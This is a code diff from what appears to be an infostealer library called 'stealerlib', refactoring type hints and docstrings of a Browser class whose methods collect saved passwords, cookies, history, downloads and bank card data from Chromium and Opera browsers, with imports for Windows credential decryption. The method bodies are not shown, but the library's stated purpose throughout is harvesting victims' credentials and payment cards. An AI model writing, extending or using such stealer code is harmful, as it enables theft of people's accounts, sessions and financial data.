@@ -13,8 +13,8 @@ import sqlite3
 import tempfile
 import win32crypt
 
-from typing import Union
 from Cryptodome.Cipher import AES
+from typing import Union, Optional
 from datetime import datetime, timedelta
 from win32crypt import CryptUnprotectData
 
@@ -26,21 +26,23 @@ from stealerlib.browser.types import BrowserTypes
 
 
 class Browser(Chromium, Opera):
-
     def __init__(self):
         Opera.__init__(self)
         Chromium.__init__(self)
 
-
-    def get_passwords(self, type="all", conv: bool=True) -> Union[list[tuple], list[list]]:
-        """Gets the saved userames and passwords for the specific browser type
+    def get_passwords(
+        self,
+        type="all",
+        conv: Optional[bool]=True
+    ) -> list[Union[list, tuple]]:
+        """Gets the saved userames and passwords for the supplied browser type
 
         Parameters:
             self (object): The object passed to the method
             type (str): Browser type to collect passwords from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
+            list: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -59,7 +61,11 @@ class Browser(Chromium, Opera):
 
         return passwords
 
-    def get_cookies(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
+    def get_cookies(
+        self,
+        type="all",
+        conv: Optional[bool]=True
+    ) -> list[Union[list, tuple]]:
         """Gets the saved cookies for the specific browser type
 
         Parameters:
@@ -67,7 +73,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect cookies from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (host, expires?, expire_date, path, name, value) lists (derived from BrowserTypes conv()) 
+            list: list of (host, expires?, expire_date, path, name, value) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -86,7 +92,11 @@ class Browser(Chromium, Opera):
 
         return cookies
 
-    def get_history(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
+    def get_history(
+        self,
+        type="all",
+        conv: Optional[bool]=True
+    ) -> list[Union[list, tuple]]:
         """Gets the saved browser history for the specific browser type
 
         Parameters:
@@ -94,7 +104,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect web history from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
+            list: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -113,7 +123,11 @@ class Browser(Chromium, Opera):
 
         return history
 
-    def get_downloads(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
+    def get_downloads(
+        self,
+        type="all",
+        conv: Optional[bool]=True
+    ) -> list[Union[list, tuple]]:
         """Gets the saved browser downloads for the specific browser type
 
         Parameters:
@@ -121,7 +135,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect download history from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
+            list: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -140,7 +154,11 @@ class Browser(Chromium, Opera):
 
         return downloads
 
-    def get_cards(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
+    def get_cards(
+        self,
+        type="all",
+        conv: Optional[bool]=True
+    ) -> list[Union[list, tuple]]:
         """Gets the saved browser bank cards for the specific browser type
 
         Parameters:
@@ -148,7 +166,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect bank cards from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
+            list: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
